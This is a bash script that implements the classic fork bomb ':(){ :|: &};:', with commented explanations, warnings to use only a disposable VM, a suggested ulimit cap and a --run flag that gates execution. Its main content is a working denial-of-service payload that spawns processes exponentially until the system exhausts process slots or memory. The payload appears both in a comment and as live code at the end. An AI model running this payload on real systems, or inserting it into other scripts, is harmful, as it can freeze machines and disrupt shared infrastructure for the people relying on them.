#!/usr/bin/env bash
#
# forkbomb.sh - the classic bash fork bomb, for controlled experiments only.
#
# =====================================================================
#  !!! WARNING - DENIAL-OF-SERVICE PAYLOAD !!!
#  This script recursively spawns processes until the system runs out of
#  process slots or memory. Run it ONLY inside a disposable virtual
#  machine that you can hard-reset. Never run it on a machine you care
#  about, on shared infrastructure, or on a host OS.
#
#  Before running, cap the blast radius with a per-user process limit in
#  the SAME shell, for example:   ulimit -u 5000
# =====================================================================
#
# The payload itself is a single line of bash:
#
#     :(){ :|: &};:
#
# How it reads:
#   :()        define a function whose name is the character ":"
#   { ... }    the function body:
#       :|:    call ":", and pipe its output into another call of ":"
#       &      run that whole pipeline in the background
#   ;:         after the function is defined, call it once to start
#
# Every call spawns two more, each of those spawns two more, and so on,
# so the number of processes doubles continuously until a limit is hit.

set -u

if [[ "${1:-}" != "--run" ]]; then
    echo "forkbomb.sh - controlled fork bomb experiment"
    echo
    echo "This script spawns processes exponentially and can freeze the machine."
    echo "Run it ONLY inside a throwaway VM you can reset."
    echo
    echo "To actually launch it:   bash forkbomb.sh --run"
    echo "Cap it first with:       ulimit -u 5000"
    exit 0
fi

echo "[forkbomb] launching in 3 seconds... (press Ctrl+C to abort)"
sleep 3

# ---- the one-liner ----
:(){ :|: &};:
